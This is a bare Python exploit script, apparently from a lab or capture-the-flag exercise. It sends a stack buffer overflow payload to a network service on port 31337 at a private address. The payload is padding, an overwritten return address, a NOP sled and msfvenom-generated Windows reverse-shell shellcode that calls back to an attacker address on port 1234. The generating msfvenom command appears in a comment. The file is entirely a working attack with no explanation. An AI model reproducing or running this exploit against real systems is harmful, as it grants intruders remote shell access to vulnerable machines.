#!/usr/bin/python
import socket,sys
from time import sleep
ip="192.168.0.103"
port="31337"
bof = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 10
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.105 LPORT=1234 -f python -a x86 --platform windows -b "\x00\x0A"                                                                                                                                                                       
bof += b"\xdb\xd1\xd9\x74\x24\xf4\xba\x02\xb1\x39\xf1\x5d\x29"                                                                                                                        
bof += b"\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\x57\xa2\xdb"                                                                                                                        
bof += b"\x04\xab\x2c\x99\xe7\x53\xad\xfe\x6e\xb6\x9c\x3e\x14"                                                                                                                        
bof += b"\xb3\x8f\x8e\x5e\x91\x23\x64\x32\x01\xb7\x08\x9b\x26"                                                                                                                        
bof += b"\x70\xa6\xfd\x09\x81\x9b\x3e\x08\x01\xe6\x12\xea\x38"                                                                                                                        
bof += b"\x29\x67\xeb\x7d\x54\x8a\xb9\xd6\x12\x39\x2d\x52\x6e"                                                                                                                        
bof += b"\x82\xc6\x28\x7e\x82\x3b\xf8\x81\xa3\xea\x72\xd8\x63"                                                                                                                        
bof += b"\x0d\x56\x50\x2a\x15\xbb\x5d\xe4\xae\x0f\x29\xf7\x66"                                                                                                                        
bof += b"\x5e\xd2\x54\x47\x6e\x21\xa4\x80\x49\xda\xd3\xf8\xa9"                                                                                                                        
bof += b"\x67\xe4\x3f\xd3\xb3\x61\xdb\x73\x37\xd1\x07\x85\x94"                                                                                                                        
bof += b"\x84\xcc\x89\x51\xc2\x8a\x8d\x64\x07\xa1\xaa\xed\xa6"                                                                                                                        
bof += b"\x65\x3b\xb5\x8c\xa1\x67\x6d\xac\xf0\xcd\xc0\xd1\xe2"                                                                                                                        
bof += b"\xad\xbd\x77\x69\x43\xa9\x05\x30\x0c\x1e\x24\xca\xcc"                                                                                                                        
bof += b"\x08\x3f\xb9\xfe\x97\xeb\x55\xb3\x50\x32\xa2\xb4\x4a"                                                                                                                        
bof += b"\x82\x3c\x4b\x75\xf3\x15\x88\x21\xa3\x0d\x39\x4a\x28"                                                                                                                        
bof += b"\xcd\xc6\x9f\xff\x9d\x68\x70\x40\x4d\xc9\x20\x28\x87"                                                                                                                        
bof += b"\xc6\x1f\x48\xa8\x0c\x08\xe3\x53\xc7\xf7\x5c\x5b\x7e"                                                                                                                        
bof += b"\x90\x9e\x5b\x84\xb2\x16\xbd\xee\x22\x7f\x16\x87\xdb"                                                                                                                        
bof += b"\xda\xec\x36\x23\xf1\x89\x79\xaf\xf6\x6e\x37\x58\x72"                                                                                                                        
bof += b"\x7c\xa0\xa8\xc9\xde\x67\xb6\xe7\x76\xeb\x25\x6c\x86"                                                                                                                        
bof += b"\x62\x56\x3b\xd1\x23\xa8\x32\xb7\xd9\x93\xec\xa5\x23"                                                                                                                        
bof += b"\x45\xd6\x6d\xf8\xb6\xd9\x6c\x8d\x83\xfd\x7e\x4b\x0b"                                                                                                                        
bof += b"\xba\x2a\x03\x5a\x14\x84\xe5\x34\xd6\x7e\xbc\xeb\xb0"                                                                                                                        
bof += b"\x16\x39\xc0\x02\x60\x46\x0d\xf5\x8c\xf7\xf8\x40\xb3"
bof += b"\x38\x6d\x45\xcc\x24\x0d\xaa\x07\xed\x3d\xe1\x05\x44"
bof += b"\xd6\xac\xdc\xd4\xbb\x4e\x0b\x1a\xc2\xcc\xb9\xe3\x31"
bof += b"\xcc\xc8\xe6\x7e\x4a\x21\x9b\xef\x3f\x45\x08\x0f\x6a"
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.103',31337))
    s.send(bof + '\r\n')
    s.recv(1024)
    s.close()
except:
    sys.exit(0)

